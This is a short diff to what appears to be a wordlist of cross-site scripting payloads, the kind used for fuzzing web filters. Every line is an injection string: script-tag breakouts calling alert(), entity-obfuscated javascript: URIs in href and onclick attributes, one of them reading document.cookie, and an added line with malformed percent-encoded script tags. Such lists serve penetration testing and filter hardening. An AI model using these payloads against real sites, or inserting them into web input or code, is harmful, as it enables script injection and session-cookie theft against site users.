@@ -1,6 +1,7 @@
 ‘>alert(154)</script><script/154=’;;;;;;;
 '>alert(154)</script><script/154=';;;;;;;
 <a aa aaa aaaa aaaaaa href=j&#97v&#97script&#x3A;&#97lert(document.cookie)>ClickMe
+</Scri%7Kt><Scri%7Kt>%7Krompt%6K1%6K</Scri%7Kt>
 '>+<script>alert(69)</script>
 <a onclick="location.href='\&fjlig;avascript:alert(1)'">go</a>
 <a onclick="location.href='\&fjlig;javascript:alert(1)'">go</a>
